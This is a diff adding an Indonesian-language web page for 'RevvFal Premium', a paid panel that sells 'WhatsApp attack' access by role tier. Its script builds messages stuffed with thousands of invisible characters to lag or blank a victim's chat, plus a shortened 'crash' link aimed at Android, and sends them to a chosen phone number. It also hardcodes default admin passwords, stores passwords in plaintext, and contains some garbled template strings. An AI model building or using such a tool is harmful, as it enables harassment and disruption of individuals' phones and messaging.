@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RevvFal Premium</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap');
+    :root{--p:#ff00ff;--s:#00ffff;--bg:#0a0a1f;}
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:var(--bg) url('https://i.ibb.co/0jYkZ3K/anime-bg.jpg') center/cover fixed;font-family:'Orbitron',sans-serif;color:#fff;min-height:100vh;}
+    .container{padding:20px;max-width:500px;margin:0 auto;padding-bottom:100px;}
+    .card{background:rgba(20,10,50,0.9);padding:30px;border-radius:20px;border:2px solid var(--p);box-shadow:0 0 30px rgba(255,0,255,0.5);backdrop-filter:blur(10px);margin:20px 0;}
+    h1,h2{text-align:center;background:linear-gradient(90deg,var(--s),var(--p));-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:20px 0;}
+    input,select{width:100%;padding:16px;margin:12px 0;border:none;border-radius:12px;background:rgba(60,40,100,0.7);color:#fff;font-size:16px;}
+    .btn{width:100%;padding:18px;border:none;border-radius:50px;font-weight:bold;background:linear-gradient(45deg,var(--p),var(--s));color:#000;cursor:pointer;margin:15px 0;box-shadow:0 0 20px rgba(255,0,255,0.6);}
+    .btn:disabled{background:#333;color:#666;cursor:not-allowed;opacity:0.6;}
+    .hidden{display:none !important;}
+    .cooldown{font-size:28px;color:#ff0066;text-align:center;margin:20px 0;font-weight:900;text-shadow:0 0 20px #ff0066;}
+    .logout-btn{position:fixed;top:15px;right:15px;background:#ff0066;color:#fff;padding:10px 18px;border-radius:50px;z-index:999;font-size:13px;}
+  </style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="loginPage" style="display:block;">
+  <div class="container" style="padding-top:100px;">
+    <h1>RevvFal</h1>
+    <div class="card">
+      <h2>LOGIN PANEL</h2>
+      <input type="text" id="loginUser" placeholder="Username">
+      <input type="password" id="loginPass" placeholder="Password">
+      <button class="btn" onclick="login()">LOGIN</button>
+      <p style="text-align:center;margin-top:25px;font-size:15px;color:#ff00ff;">
+        Belum Punya Akun? Beli Lol
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN PANEL -->
+<div id="mainPanel" class="hidden">
+  <button class="logout-btn" onclick="logout()">LOGOUT</button>
+  <div class="container">
+    <h1>RevvFal Panel</h1>
+    <div style="text-align:center;margin:20px;color:#00ffff;font-size:18px;">
+      Welcome, <span id="welcomeUser"></span> [<span id="userRole"></span>]
+    </div>
+
+    <div id="addUserSection" class="card">
+      <h2>Add New User</h2>
+      <input type="text" id="newUsername" placeholder="Username">
+      <input type="password" id="newPassword" placeholder="Password">
+      <select id="newRole">
+        <option value="member">Member</option>
+        <option value="reseller">Reseller</option>
+        <option value="admin" class="admin-only">Admin</option>
+        <option value="partner" class="partner-only">Partner</option>
+      </select>
+      <input type="number" id="newDays" placeholder="Expiry Days (1-365)" min="1" max="365">
+      <button class="btn" onclick="createUser()">CREATE USER</button>
+    </div>
+
+    <div class="card" style="text-align:center;">
+      <button class="btn" onclick="openAttack()">OPEN WHATSAPP ATTACK</button>
+    </div>
+
+    <div class="card">
+      <h2>User List</h2>
+      <div id="userList"></div>
+    </div>
+  </div>
+</div>
+
+<!-- WHATSAPP ATTACK PAGE -->
+<div id="attackPage" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg);padding:20px;z-index:998;">
+  <button style="position:absolute;top:15px;left:15px;background:#333;padding:12px 20px;border-radius:50px;" onclick="backToPanel()">BACK</button>
+  <h1 style="text-align:center;margin-top:60px;color:#00ffff;">WhatsApp Attack</h1>
+  <input type="text" id="targetNumber" placeholder="628xxx" style="margin:20px 0;">
+  <input type="text" id="bugTypeDisplay" placeholder="Pilih Bug" readonly onclick="document.getElementById('bugModal').style.display='flex'">
+  
+  <div id="cooldownTimer" class="cooldown hidden">Tunggu 10:00</div>
+  <button id="sendBtn" class="btn" onclick="sendBug()">SEND BUG</button>
+</div>
+
+<!-- BUG MODAL -->
+<div id="bugModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.97);justify-content:center;align-items:center;z-index:999;">
+  <div style="background:rgba(30,20,60,0.95);padding:30px;border-radius:20px;border:2px solid var(--p);width:90%;max-width:400px;">
+    <h2 style="color:#00ffff;text-align:center;">Pilih Bug</h2>
+    <div style="background:#6e00ff;padding:18px;margin:15px 0;border-radius:12px;cursor:pointer;" onclick="selectBug('DELAY INVISIBLE','invisible')">DELAY INVISIBLE</div>
+    <div style="background:#00ffaa;padding:18px;margin:15px 0;border-radius:12px;cursor:pointer;" onclick="selectBug('BLANK DELAY','blank')">BLANK DELAY</div>
+    <div style="background:#ff0066;padding:18px;margin:15px 0;border-radius:12px;cursor:pointer;" onclick="selectBug('CRASH UI','crash')">CRASH UI ANDROID</div>
+    <button class="btn" onclick="document.getElementById('bugModal').style.display='none'">TUTUP</button>
+  </div>
+</div>
+
+<script>
+  // Default users (termasuk akun Partner kamu)
+  if(!localStorage.getItem('users')){
+    const defaultUsers = [
+      {user:"admin", pass:"admin123", role:"admin", expiry:new Date('2050-12-31').getTime()},
+      {user:"RevvLontong", pass:"lmaohyu234", role:"partner", expiry:new Date('2789-04-07').getTime()}
+    ];
+    localStorage.setItem('users', JSON.stringify(defaultUsers));
+  }
+
+  let currentRole = "";
+  let selectedBug = "";
+  let cooldownEnd = 0;
+
+  // COOLDOWN SETTINGS PER ROLE
+  const cooldownSeconds = {
+    member: 600,    // 10 menit
+    reseller: 300,  // 5 menit
+    admin: 120,     // 2 menit
+    partner: 0      // tanpa jeda
+  };
+
+  function login(){
+    const u = document.getElementById('loginUser').value.trim();
+    const p = document.getElementById('loginPass').value;
+    const users = JSON.parse(localStorage.getItem('users')||'[]');
+    const user = users.find(x=>x.user===u && x.pass===p && x.expiry > Date.now());
+    if(user){
+      localStorage.setItem('loggedIn','true');
+      localStorage.setItem('currentUser',u);
+      localStorage.setItem('currentRole',user.role);
+      currentRole = user.role;
+      document.getElementById('loginPage').style.display='none';
+      document.getElementById('mainPanel').classList.remove('hidden');
+      document.getElementById('welcomeUser').textContent = u;
+      document.getElementById('userRole').textContent = user.role.toUpperCase();
+      setupRolePermissions();
+      loadUserList();
+    }else alert("Salah / Expired bro!");
+  }
+
+  function logout(){
+    localStorage.removeItem('loggedIn');
+    localStorage.removeItem('currentUser');
+    localStorage.removeItem('currentRole');
+    location.reload();
+  }
+
+  if(localStorage.getItem('loggedIn')==='true'){
+    currentRole = localStorage.getItem('currentRole');
+    document.getElementById('loginPage').style.display='none';
+    document.getElementById('mainPanel').classList.remove('hidden');
+    document.getElementById('welcomeUser').textContent = localStorage.getItem('currentUser');
+    document.getElementById('userRole').textContent = currentRole.toUpperCase();
+    setupRolePermissions();
+    loadUserList();
+  }
+
+  function setupRolePermissions(){
+    const addSection = document.getElementById('addUserSection');
+    const adminOpts = document.querySelectorAll('.admin-only');
+    const partnerOpts = document.querySelectorAll('.partner-only');
+
+    if(currentRole === 'member') addSection.classList.add('hidden');
+    else addSection.classList.remove('hidden');
+
+    adminOpts.forEach(o=>o.style.display='none');
+    partnerOpts.forEach(o=>o.style.display='none');
+
+    if(['admin','partner'].includes(currentRole)) adminOpts.forEach(o=>o.style.display='block');
+    if(currentRole === 'partner') partnerOpts.forEach(o=>o.style.display='block');
+  }
+
+  function createUser(){ /* sama seperti sebelumnya */ 
+    const username = document.getElementById('newUsername').value.trim();
+    const pass = document.getElementById('newPassword').value;
+    const role = document.getElementById('newRole').value;
+    const days = parseInt(document.getElementById('newDays').value);
+    if(!username||!pass||days<1||days>365){alert("Isi lengkap!");return;}
+    const users = JSON.parse(localStorage.getItem('users')||'[]');
+    if(users.find(x=>x.user===username)){alert("Username sudah ada!");return;}
+    const exp = new Date(); exp.setDate(exp.getDate() + days);
+    users.push({user:username, pass:pass, role:role, expiry:exp.getTime()});
+    localStorage.setItem('users',JSON.stringify(users));
+    alert(`User \( {username} dibuat! Expired: \){exp.toLocaleDateString('id-ID')}`);
+    loadUserList();
+    document.getElementById('newUsername').value=''; document.getElementById('newPassword').value=''; document.getElementById('newDays').value='';
+  }
+
+  function loadUserList(){ /* sama seperti sebelumnya */ 
+    const list = document.getElementById('userList');
+    const users = JSON.parse(localStorage.getItem('users')||'[]');
+    list.innerHTML='';
+    users.forEach(u=>{
+      const exp = new Date(u.expiry);
+      const status = u.expiry > Date.now() ? 'ACTIVE' : 'EXPIRED';
+      const color = status==='ACTIVE'?'#00ff00':'#ff0066';
+      list.innerHTML += `<div style="background:rgba(50,30,90,0.6);padding:15px;border-radius:12px;margin:10px 0;border-left:4px solid var(--p);">
+        <b>\( {u.user}</b> [ \){u.role.toUpperCase()}]<br>Pass: ${u.pass}<br>
+        Expired: \( {exp.toLocaleDateString('id-ID')} <span style="color: \){color};">(${status})</span>
+      </div>`;
+    });
+  }
+
+  // COOLDOWN SYSTEM
+  function startCooldown(){
+    const seconds = cooldownSeconds[currentRole] || 600;
+    if(seconds === 0) return; // Partner langsung bisa
+
+    cooldownEnd = Date.now() + (seconds * 1000);
+    localStorage.setItem('cooldownEnd', cooldownEnd);
+    updateCooldownDisplay();
+  }
+
+  function updateCooldownDisplay(){
+    const now = Date.now();
+    if(cooldownEnd > now){
+      const remaining = Math.ceil((cooldownEnd - now) / 1000);
+      const mins = String(Math.floor(remaining / 60)).padStart(2,'0');
+      const secs = String(remaining % 60).padStart(2,'0');
+      document.getElementById('cooldownTimer').textContent = `Tunggu \( {mins}: \){secs}`;
+      document.getElementById('cooldownTimer').classList.remove('hidden');
+      document.getElementById('sendBtn').disabled = true;
+      setTimeout(updateCooldownDisplay, 500);
+    } else {
+      document.getElementById('cooldownTimer').classList.add('hidden');
+      document.getElementById('sendBtn').disabled = false;
+      document.getElementById('sendBtn').textContent = 'SEND BUG';
+      localStorage.removeItem('cooldownEnd');
+    }
+  }
+
+  function openAttack(){
+    document.getElementById('attackPage').classList.remove('hidden');
+    // Cek cooldown saat buka halaman
+    const saved = localStorage.getItem('cooldownEnd');
+    if(saved && parseInt(saved) > Date.now()){
+      cooldownEnd = parseInt(saved);
+      updateCooldownDisplay();
+    } else {
+      document.getElementById('cooldownTimer').classList.add('hidden');
+      document.getElementById('sendBtn').disabled = false;
+    }
+  }
+
+  function backToPanel(){ document.getElementById('attackPage').classList.add('hidden'); }
+
+  function selectBug(name,type){
+    selectedBug=type;
+    document.getElementById('bugTypeDisplay').value=name;
+    document.getElementById('bugModal').style.display='none';
+  }
+
+  function sendBug(){
+    if(document.getElementById('sendBtn').disabled) return;
+    let no = document.getElementById('targetNumber').value.trim();
+    if(!no||!selectedBug){alert("Lengkapi dulu!");return;}
+    no = no.replace(/^0/,'62').replace(/^\+62/,'62');
+    if(!no.startsWith('62')) no='62'+no.replace(/[^0-9]/g,'');
+
+    let pesan = "";
+    if(selectedBug==='invisible') pesan="‏‏‎ ‎".repeat(5000)+"RevvFal Invisible";
+    if(selectedBug==='blank') pesan="‎".repeat(9999)+"Blank Delay";
+    if(selectedBug==='crash') pesan="https://bit.ly/crashwa2025-revvfal";
+
+    window.location.href = `whatsapp://send/?phone=\( {no}&text= \){encodeURIComponent(pesan)}&app_absent=0`;
+
+    // Mulai cooldown
+    startCooldown();
+    document.getElementById('sendBtn').textContent = 'SENDING...';
+  }
+</script>
+</body>
+      </html>
